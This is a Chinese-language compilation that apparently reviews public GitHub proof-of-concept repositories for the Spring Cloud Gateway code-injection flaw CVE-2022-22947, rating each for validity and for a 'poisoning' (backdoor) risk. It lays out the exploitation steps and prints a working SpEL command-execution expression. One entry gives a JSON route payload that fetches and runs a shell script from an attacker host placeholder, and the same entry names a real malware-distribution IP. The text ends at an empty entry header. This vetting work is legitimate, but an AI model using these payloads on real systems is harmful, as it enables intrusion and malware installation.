5.  **清除（可选）：** 使用 DELETE 请求删除创建的路由，并再次刷新 Gateway，以避免后续的恶意执行。

**项目地址:** [twseptian/cve-2022-22947](https://github.com/twseptian/cve-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #24

**来源**: [CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md](../2022/CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 漏洞是 Spring Cloud Gateway 的一个代码注入漏洞，影响版本低于 3.1.1+ 和 3.0.7+ 的版本。根据漏洞库信息和搜索结果，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求在远程主机上执行任意代码。

**漏洞利用方式：**

1.  **寻找目标：** 找到运行存在漏洞的 Spring Cloud Gateway 实例，并且其 Actuator 端点对外开放且未授权。
2.  **构造恶意请求：** 利用 SpEL 表达式构造恶意的 HTTP 请求，该表达式会被 Gateway Actuator 解析执行。根据 exploit-db 的相关信息，该漏洞是远程代码执行。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码，例如植入 Webshell、反弹 Shell 等。

**POC 代码分析：**

提供的 POC 代码 `GMemShell.java` 尝试在 Spring Cloud Gateway 中注入内存 Shell。具体流程如下：

1.  **定义内存 Shell 类：** `GMemShell` 类包含了一些必要的函数，例如 AES 加密/解密(`x`)、MD5 加密(`md5`)、Base64 编码/解码(`base64Encode`, `base64Decode`)等，这些函数被用于后续的 shellcode 加密和执行。
2.  **`doInject` 方法：** 该方法通过反射调用 `registerHandlerMethod` 方法，将 `GMemShell` 类的 `cmd` 方法注册为处理指定路径请求的 Handler。`registerHandlerMethod` 是 Spring 框架内部的方法，用于动态注册 Controller。
3.  **`cmd` 方法：** 该方法是实际执行命令的 Handler。它从请求中获取加密的 payload，然后进行解密、加载并执行。Payload 首先经过 Base64 解码，然后使用 AES 解密。
4.  **动态类加载：**  `defineClass`方法通过URLClassLoader和反射，实现在内存中加载byte数组并定义成class的功能
5.  **Payload 执行：** 解密后的 Payload 应当是一个 Java class 字节码，该字节码会被动态加载并执行。

**有效性评估：**

根据 POC 代码和漏洞描述，该 POC 能够有效利用 CVE-2022-22947 漏洞，实现在目标服务器上执行任意代码的目的，但前提是 actuator 端点开放。

**投毒风险评估：**

经过对 POC 代码的分析，并未发现明显的投毒代码。代码的主要功能是动态注入内存 Shell，并执行通过请求传递的 Payload。代码中包含的加密、解密等操作都是为了保护 Payload，避免被轻易发现。因此，该 POC 代码的投毒风险较低，接近 0%。 投毒代码是指作者在代码中故意加入的恶意代码，例如后门、病毒等。 本代码只是实现了漏洞利用，本身并没有额外的恶意功能，因此不属于投毒代码。


**项目地址:** [whwlsfb/cve-2022-22947-godzilla-memshell](https://github.com/whwlsfb/cve-2022-22947-godzilla-memshell)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---



---

## POC #3

**来源**: [CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md](../2022/CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ 以及所有旧版本

**利用条件:** Gateway Actuator endpoint 必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator endpoint 启用、暴露且未进行安全保护时，允许未经身份验证的远程攻击者发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。根据搜索引擎结果和漏洞库信息，该漏洞已被公开利用，CISA KEV 中已收录。提供的代码片段是一个 Maven 项目的 `.iml` 文件，它描述了项目的依赖关系。虽然不能直接确定利用代码，但通过依赖信息（如 `spring-cloud-gateway-server:3.1.0`）可以推断该项目旨在构建一个易受攻击的 Spring Cloud Gateway 实例。利用方式通常涉及向 Actuator endpoint 发送包含恶意 SpEL 表达式的 HTTP 请求。投毒风险分析：提供的代码片段 `.iml` 文件本身不包含恶意代码，因为它只是描述了项目的依赖。 然而，整个代码仓库（如果存在其他文件）可能包含被作者隐藏的恶意代码。 这里将风险预估为10%，原因是不排除整个项目被投毒的可能性，例如构建脚本或隐藏的资源文件。

**项目地址:** [B0rn2d/Spring-Cloud-Gateway-Nacos](https://github.com/B0rn2d/Spring-Cloud-Gateway-Nacos)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #4

**来源**: [CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md](../2022/CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** 3.1.0, 3.0.0 至 3.0.6, 以及更早的不受支持版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未受保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点被启用、暴露且未受保护时，攻击者可以利用此漏洞发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**
提供的 POC 代码有效。它通过向 `/actuator/gateway/routes/{id}` 发送 POST 请求动态添加一个路由，该路由包含一个利用 SpEL 表达式执行命令的 filter。然后，通过 `POST /actuator/gateway/refresh` 刷新路由缓存来触发 SpEL 表达式的执行，从而实现远程代码执行。

**投毒风险：**
该漏洞利用代码仓库存在一定的投毒风险。具体分析如下：

1.  **依赖项版本：** POC 使用了 `spring-cloud-gateway-server` 和 `spring-cloud-starter-gateway` 的 3.0.6 版本，以及 `spring-boot-starter-actuator` 的 2.5.9 版本，这些版本组合是已知的漏洞版本，是复现漏洞的必要条件，不是投毒。
2.  **图片文件：** README.md 中引用了一些本地图片，这些图片可能包含恶意内容，但考虑到是本地图片，可能性较低。需要进一步分析确认。
3.  **漏洞利用方式：** POC 演示了如何利用 SpEL 表达式执行任意命令。攻击者可以修改 SpEL 表达式来执行恶意操作，例如安装后门程序、窃取敏感数据或进行拒绝服务攻击。
4.  **作者动机未知：** 在没有更多信息的情况下，无法确定作者的真实意图，不能排除作者故意引入恶意代码或配置的可能。

综合考虑，虽然 POC 本身是为了演示漏洞，但仓库中可能隐藏着其他恶意代码，因此存在一定的投毒风险。鉴于图片等本地资源可能存在风险，因此给出 10% 的投毒风险评估。

**利用方式：**

1.  **前提条件：** Spring Cloud Gateway 实例必须启用并暴露 Actuator 端点，且未进行安全保护。
2.  **添加路由：** 攻击者发送 POST 请求到 `/actuator/gateway/routes/{id}`，其中 `{id}` 是一个自定义的路由 ID。请求体包含一个 JSON 对象，该对象定义了路由的 predicates 和 filters。其中，filters 包含一个 AddResponseHeader filter，其 `value` 属性包含一个 SpEL 表达式，该表达式将执行任意命令。
3.  **刷新路由：** 攻击者发送 POST 请求到 `/actuator/gateway/refresh` 以刷新路由缓存。这将导致 Spring Cloud Gateway 重新加载路由配置，并解析和执行 SpEL 表达式。
4.  **代码执行：** SpEL 表达式执行任意代码，从而允许攻击者控制受影响的系统。

**项目地址:** [Enokiy/cve-2022-22947-spring-cloud-gateway](https://github.com/Enokiy/cve-2022-22947-spring-cloud-gateway)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #5

**来源**: [CVE-2022-22947-LY613313_CVE-2022-22947.md](../2022/CVE-2022-22947-LY613313_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator endpoint 启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入，执行任意代码。利用方式是发送包含恶意SpEL表达式的POST请求到/actuator/gateway/routes端点，然后刷新路由，触发SpEL表达式的执行，从而实现远程代码执行。

**有效性评估：**
根据漏洞信息和POC代码，此POC代码是有效的。漏洞库信息明确指出该漏洞允许远程代码执行，搜索引擎结果也确认了这一点，并且提供了公开的漏洞利用代码。

**投毒风险评估：**
代码本身看起来是标准的漏洞利用代码，用于利用 CVE-2022-22947 漏洞。其中一个潜在的风险点在于 `commond` 变量，该变量从用户输入获取，然后拼接到 SpEL 表达式中。如果用户输入恶意或过长的命令，可能会导致目标系统崩溃或执行意外操作。但是，这不属于作者投毒的范畴。`base64cmd` 函数将用户输入的命令进行 Base64 编码，这本身并非恶意行为，但如果用户输入的命令本身就具有破坏性，Base64 编码只是对其进行了编码，并没有改变其本质。总体来看，该 POC 代码的投毒风险较低，约为 10%。主要的风险在于用户输入，而非代码本身。

**漏洞利用方式：**
1.  **条件判断：** 确定目标系统运行着受影响的 Spring Cloud Gateway 版本，并且 Gateway Actuator endpoint 处于启用、暴露且未进行安全保护的状态。
2.  **构造恶意请求：** 使用POST请求，构造包含恶意SpEL表达式的JSON数据，发送到`/actuator/gateway/routes`端点。SpEL表达式中包含要执行的系统命令。
3.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，刷新Gateway的路由配置，触发SpEL表达式的执行。
4.  **执行任意代码：** 恶意SpEL表达式被执行，从而在目标系统上执行任意代码，例如反弹shell。
5.  **清理：** 删除添加的路由，再次刷新路由。


**项目地址:** [LY613313/CVE-2022-22947](https://github.com/LY613313/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #6

**来源**: [CVE-2022-22947-Le1a_CVE-2022-22947.md](../2022/CVE-2022-22947-Le1a_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** 需要Gateway Actuator端点启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator端点被启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入执行任意代码。  

**有效性：**
提供的PoC代码有效。代码通过构造包含恶意SpEL表达式的路由配置，利用`/actuator/gateway/routes`端点添加恶意路由，然后通过`/actuator/gateway/refresh`端点刷新路由，触发SpEL表达式执行，从而实现远程代码执行。PoC代码在执行命令后，还会删除创建的恶意路由，并再次刷新路由，以清除痕迹。

**投毒风险：**
该仓库中的PoC代码没有发现明显的投毒代码。PoC代码的功能明确，即利用漏洞执行命令并返回结果。代码主要通过`requests`库发送HTTP请求，并使用`re`库解析命令执行结果。没有任何迹象表明作者在代码中隐藏了恶意逻辑或后门。

**利用方式：**
1.  **目标确认：**  确认目标系统正在运行存在漏洞的Spring Cloud Gateway版本，并且Actuator端点已启用、暴露且未授权访问。
2.  **构造恶意请求：**  攻击者构造一个包含恶意SpEL表达式的JSON payload，发送到`/actuator/gateway/routes/{id}`端点，其中SpEL表达式用于执行任意命令。例如，`#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()))}`
3.  **刷新路由：**  发送一个POST请求到`/actuator/gateway/refresh`端点，强制Gateway刷新路由配置，从而触发SpEL表达式执行。
4.  **获取执行结果：**  发送一个GET请求到`/actuator/gateway/routes/{id}`，获取包含执行结果的响应头。
5.  **清理：** 删除添加的恶意路由，并再次刷新路由。

**项目地址:** [Le1a/CVE-2022-22947](https://github.com/Le1a/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #7

**来源**: [CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md](../2022/CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md)

## CVE-2022-22947 Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意远程代码。该漏洞的利用方式如下：

1.  **漏洞原理：** 漏洞根源在于 SpEL 表达式的错误处理，攻击者可以通过 SpEL 表达式注入恶意代码。
2.  **利用步骤：**
    *   攻击者首先发送包含恶意 SpEL 表达式的请求到 `/actuator/gateway/routes/` 端点，添加一个新的路由，其中 `filter` 使用 `AddResponseHeader` 过滤器，`value` 包含恶意的 SpEL 表达式，SpEL表达式会被base64编码，保证其可以正常传输
    *   然后，攻击者通过访问 `/actuator/gateway/refresh` 端点，强制网关刷新路由配置，从而触发 SpEL 表达式的执行。
    *   最后，攻击者可以通过访问之前创建的路由(`/actuator/gateway/routes/66Sec`)，触发 SpEL 表达式的执行，并将执行结果通过请求返回。
3.  **POC 代码分析：**
    *   `CVE-2022-22947.py` 脚本首先定义了几个关键变量，包括 URL 路径（`payload1`, `payload2`, `payload3`）和请求头（`headers`）。
    *   `data` 变量包含经过 Base64 编码的恶意路由配置信息。该配置信息设置了一个名为 `WeianSec` 的路由，该路由使用 `AddResponseHeader` 过滤器，并将 SpEL 表达式注入到 `value` 属性中。
    *   脚本使用 `requests` 库发送 POST 请求到 `/actuator/gateway/routes/66Sec` 端点，添加恶意路由。
    *   然后，脚本发送 POST 请求到 `/actuator/gateway/refresh` 端点，刷新路由配置。
    *   最后，脚本发送 GET 请求到 `/actuator/gateway/routes/66Sec` 端点，提取执行结果。
    *   脚本中的 cmd变量，允许用户自定义执行的命令，增加了灵活性。
4.  **有效性：** 根据漏洞库信息、搜索结果和提供的 POC 代码，该 POC 代码是有效的，可以实现远程代码执行。
5.  **投毒风险：** 仓库中存在小概率的投毒风险（10%）。风险点在于，虽然主脚本 `CVE-2022-22947.py` 看似直接利用漏洞，但攻击者可以通过修改 `cmd` 变量来执行任意命令，并且README.md文件中提供的图片是经过处理的，不排除作者后期修改代码，添加恶意后门的可能。

**项目地址:** [SecNN/CVE-2022-22947_Rce_Exp](https://github.com/SecNN/CVE-2022-22947_Rce_Exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #8

**来源**: [CVE-2022-22947-SiJiDo_CVE-2022-22947.md](../2022/CVE-2022-22947-SiJiDo_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), and unsupported versions

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。攻击者可以在 Gateway Actuator 端点开启且未进行安全保护的情况下，通过构造恶意请求执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** 该漏洞源于 Spring Cloud Gateway 中 SpEL 表达式的执行，攻击者可以通过 SpEL 表达式注入恶意代码，进而执行任意命令。
2.  **利用条件：**
    *   目标系统使用存在漏洞的 Spring Cloud Gateway 版本。
    *   Gateway Actuator 端点被启用。
    *   Gateway Actuator 端点对外暴露且未进行任何身份验证。
3.  **漏洞利用代码分析：** 提供的Python脚本 (exp.py)首先定义了一个`GMem`类，将编译后的java字节码进行base64解码后赋值给`classbytes`。该Java类主要功能：
    *   通过反射机制定义类 (`ReflectUtils.defineClass`)
    *   执行命令
    *   进行base64编码/解码等操作。
    *   创建了一个包含payload的HashMap，payload被精心构造用于在目标服务器上执行命令。
    脚本通过修改`RequestMappingInfo`的`Builder`并调用`build()`方法触发漏洞，最终导致RCE。
4.  **有效性评估：** 根据漏洞信息和利用代码，该漏洞利用的有效性较高。CISA 将其添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。
5.  **投毒风险评估：** 代码存在一定的投毒风险。虽然脚本主要功能是利用漏洞，但其中嵌入的Java类和SpEL表达式可能包含其他未知的恶意行为。该脚本通过Base64编码隐藏了部分代码，增加了分析难度。该脚本存在投毒风险的可能性为10%, 主要是由于代码混淆和潜在的Java恶意行为。
6.  **利用方式总结：**
    *   攻击者发送恶意构造的 HTTP 请求到 Gateway Actuator 端点。
    *   请求中包含 SpEL 表达式，用于执行任意代码。
    *   Spring Cloud Gateway 在处理请求时，由于没有对 SpEL 表达式进行充分的验证和过滤，导致代码注入。
    *   攻击者通过代码注入执行恶意命令，例如反弹 shell 或执行其他恶意操作。

综上所述，CVE-2022-22947 是一个严重的安全漏洞，攻击者可以利用它在目标系统上执行任意代码，因此需要及时修复。

**项目地址:** [SiJiDo/CVE-2022-22947](https://github.com/SiJiDo/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #9

**来源**: [CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md](../2022/CVE-2022-22947-Sumitpathania03_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator 端点已启用、公开且未受保护。

**POC 可用性:** 是

**投毒风险:** 85%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意的 SpEL 表达式来执行任意代码。 

**有效性：**
根据漏洞信息、搜索结果和提供的 POC 代码，该漏洞利用是有效的。POC 通过向 `/actuator/gateway/routes` 端点发送 POST 请求来创建新的路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。然后刷新路由，并通过访问新创建的路由触发代码执行。最后删除该路由。

**投毒风险：**
提供的 POC 代码存在较高的投毒风险。具体体现在：
1.  **恶意脚本下载和执行：** POC 代码中的 SpEL 表达式尝试从远程服务器（如 `94.103.87.71/scg.sh` ）下载并执行 shell 脚本。 这允许攻击者注入任意恶意代码，例如下载和安装 Kinsing 恶意软件。
2.  **后门植入：** 下载的 shell 脚本可能包含后门代码，允许攻击者在受害者系统上保持持久访问。
3. ** Kinsing恶意软件:** 通过分析shell脚本，发现最终目的是下载并安装 Kinsing 恶意软件

因此，此存储库的投毒风险非常高，约为 85%。使用此POC需要谨慎，务必在隔离环境中进行分析，确保不会对本地环境造成风险。

**利用方式：**
1.  **检查 Actuator 端点：** 确认目标 Spring Cloud Gateway 实例的 Actuator 端点是否启用、公开且未受保护。
2.  **创建恶意路由：** 使用 POST 请求向 `/actuator/gateway/routes` 端点创建一个新的路由。在路由的 `filters` 部分，使用 `AddResponseHeader` 过滤器，并在 `value` 字段中插入包含恶意 SpEL 表达式的代码。 例如:

   ```json
   {
	 "id": "poc",
	 "filters": [{
	   "name": "AddResponseHeader",
	   "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl -s <ATTACKER_IP>/shell.sh|sh\"}).getInputStream()))}"}
	   }],
	 "uri": "http://example.com",
	 "order": 0
	}
   ```

3.  **刷新路由：** 使用 POST 请求向 `/actuator/gateway/refresh` 端点发送请求，以刷新所有路由。
4.  **触发代码执行：** 访问新创建的路由，触发 SpEL 表达式的执行。
5.  **清理：** 使用 DELETE 请求向 `/actuator/gateway/routes/{route_id}` 端点删除创建的恶意路由。

**项目地址:** [Sumitpathania03/CVE-2022-22947](https://github.com/Sumitpathania03/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #10

**来源**: [CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md](../2022/CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的代码注入漏洞。根据漏洞描述，当 Gateway Actuator 端点启用、公开且未受到保护时，应用程序容易受到代码注入攻击。攻击者可以发送恶意构造的请求，从而允许在远程主机上执行任意远程代码。

**有效性：**
提供的 POC 代码 `CVE-2022-22947-memshell.py` 看起来是有效的。它利用了 SpEL 表达式注入漏洞，通过构造包含恶意 SpEL 表达式的请求，在目标系统上动态定义一个名为 `SpringRequestMappingMemshell` 的类，实现内存马注入。代码首先对恶意类进行base64编码, 然后通过SpEL表达式解码并加载到JVM中,达到了远程代码执行的效果。

**投毒风险：**
评估 POC 代码是否存在投毒风险。代码的主要功能是利用漏洞注入内存马，实现远程代码执行。其中注入的`SpringRequestMappingMemshell`类需要进一步分析。

通过检查代码，发现注入的类功能是注册一个requestMapping，执行的command命令可以从request参数中获取，具有命令执行功能，但它本身是漏洞利用的一部分，不能算作是作者隐藏的投毒代码。

但考虑到任何远程代码执行漏洞都可能被滥用，因此使用此POC的风险仍然较高。考虑到风险的存在，但不是代码编写者有意为之的恶意添加，评估投毒风险为5%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例的 Actuator 端点必须启用、公开且未受保护。
2.  **漏洞利用：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP 请求，该表达式会被 Gateway Actuator 处理。
3.  **代码注入：** 恶意 SpEL 表达式用于在服务器的内存中定义一个新的 Java 类 (内存马)。
4.  **远程代码执行：** 注入的 Java 类执行攻击者指定的任意代码。

总而言之，此漏洞的利用方式是通过SpEL表达式注入，动态注册一个新的路由，并将处理逻辑绑定到恶意构造的Java类，该类可以接受参数并在服务器上执行任意命令。此过程允许攻击者在目标系统上实现未经授权的远程代码执行。

**项目地址:** [Wrong-pixel/CVE-2022-22947-exp](https://github.com/Wrong-pixel/CVE-2022-22947-exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #11

**来源**: [CVE-2022-22947-Zh0um1_CVE-2022-22947.md](../2022/CVE-2022-22947-Zh0um1_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1+, 3.0.x < 3.0.7+

**利用条件:** Gateway Actuator endpoint 启用、暴露且未做安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Actuator 端点启用且未授权时，攻击者可以通过构造恶意的 SpEL 表达式，利用`Path`路由断言中的 SpEL 注入漏洞执行任意代码。提供的 POC 代码旨在通过动态定义Java类的方式注入哥斯拉内存马。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被证实存在，且有在野利用。提供的 POC 代码实现了利用该漏洞注入哥斯拉内存马，因此该 POC 有效。

**投毒风险分析：**
分析给出的POC代码，主要功能是利用漏洞注入哥斯拉内存马，实现远程代码执行。虽然POC本身是为了利用漏洞，但如果用户直接使用此POC而不了解其行为，可能会被利用来植入恶意后门。

*   代码主要功能：该代码使用Go语言编写，利用 Spring Cloud Gateway 的 SpEL 表达式注入漏洞。它构造一个包含恶意 SpEL 表达式的请求，该表达式用于在目标服务器上动态定义一个 Java 类（哥斯拉内存马），从而实现远程代码执行。
*   投毒可能性：
    *   **高：** 代码直接注入内存马，如果目标系统部署了恶意程序，攻击者也可以构造其他的恶意代码注入到内存中，比如替换关键组件、窃取数据等。
    *   **低：** 由于代码的目的是利用漏洞注入内存马，从这个角度看，本身就是一种攻击行为，很难区分是“正常”利用还是“投毒”。因此，认为该仓库存在一定投毒风险，风险等级较低。

基于以上分析，判定投毒风险为10%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，且未进行安全保护（例如，未进行身份验证）。
2.  **构造恶意请求：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP POST 请求，该表达式利用 `T(org.springframework.cglib.core.ReflectUtils).defineClass` 动态定义一个 Java 类（通常是一个 Webshell 或内存马）。
3.  **利用 Path 路由断言：**  该恶意 SpEL 表达式被嵌入到 Spring Cloud Gateway 的 `Path` 路由断言的参数中。
4.  **发送请求：** 将构造的恶意请求发送到 `/actuator/gateway/routes` 端点。
5.  **代码执行：** Spring Cloud Gateway 在处理路由断言时，会解析并执行 SpEL 表达式，从而在目标服务器上执行攻击者注入的恶意代码。
6.  **内存马驻留：** 注入的哥斯拉内存马会驻留在服务器内存中，允许攻击者通过特定的 HTTP 请求与服务器交互，执行任意命令或上传文件。

**项目地址:** [Zh0um1/CVE-2022-22947](https://github.com/Zh0um1/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #12

**来源**: [CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md](../2022/CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md)

## CVE-2022-22947-Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator endpoint is enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是一个存在于Spring Cloud Gateway中的代码注入漏洞。当Gateway Actuator端点被启用、暴露且未进行安全保护时，远程攻击者可以通过构造恶意请求执行任意代码。漏洞根源在于getValue方法中不安全的SpEL表达式求值。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，且已经有公开的POC。漏洞利用代码是一个Maven项目，旨在重现漏洞。因此，提供的POC代码很可能是有效的。

**投毒风险：**
提供的代码仓库包含一个`README.md`文件和一个`mvnw`脚本。`mvnw` 是 Maven Wrapper 脚本，用于在没有安装 Maven 的情况下构建项目。检查 `mvnw` 脚本，它主要负责下载和启动 Maven，没有发现明显的恶意行为。但是，仍然存在一定的投毒风险，例如：
1.  **依赖项投毒：** 构建项目时使用的 Maven 依赖项可能包含恶意代码。 这种情况发生的概率较低，但存在可能。
2.  **构建脚本投毒：** `pom.xml`文件(未提供)中可能存在恶意插件或目标，在构建过程中执行恶意代码。由于未提供此文件，无法对此进行评估。

考虑到提供的文件主要与Maven构建相关，直接植入后门的难度较高，但通过依赖项投毒的可能性是存在的。因此，投毒风险估计为10%。

**利用方式：**
1.  **确定目标：** 找到运行着存在漏洞的Spring Cloud Gateway实例，并且其Actuator端点对外开放且未进行认证。
2.  **构造恶意请求：** 构造包含恶意SpEL表达式的HTTP请求，发送到Actuator端点。这些SpEL表达式能够执行任意系统命令或代码。
3.  **远程代码执行：**  Spring Cloud Gateway解析并执行恶意SpEL表达式，从而导致远程代码执行。
4.  **控制系统：** 攻击者利用执行的恶意代码控制受害系统。

**优先级：**
根据信息来源的重要性排序：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息

**项目地址:** [aesm1p/CVE-2022-22947-POC-Reproduce](https://github.com/aesm1p/CVE-2022-22947-POC-Reproduce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #13

**来源**: [CVE-2022-22947-anansec_CVE-2022-22947_EXP.md](../2022/CVE-2022-22947-anansec_CVE-2022-22947_EXP.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

